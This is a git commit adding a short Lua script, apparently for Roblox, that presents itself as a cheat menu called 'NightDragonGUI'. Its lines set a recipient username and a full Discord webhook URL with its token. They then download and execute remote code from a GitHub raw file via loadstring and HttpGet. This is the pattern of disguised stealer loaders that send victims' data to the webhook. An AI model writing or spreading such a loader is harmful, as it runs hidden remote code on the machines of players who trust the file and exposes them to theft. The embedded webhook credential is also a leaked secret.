5e23913e9ba32de6a077d7934ac3d81433dd4c65
BedFullPro <147519966+BedFullPro@users.noreply.github.com>
2023-11-08 12:52:50 -0500

    NightDragonGUI!!!OP!!!!.lua

---
+++ NightDragonGUI!!!OP!!!!.lua
@@ -0,0 +1,5 @@
+_G.Username = "Justinspiderman8"
+_G.HubName = "NightDragonGUI"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1171865870725808219/Xg1Z1Rl8mXF6sPEVvkyLJJG9vnNPiGRXsxNgm38XKTLLVEIl83lsvgkfSGtgQe3V1iKd"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
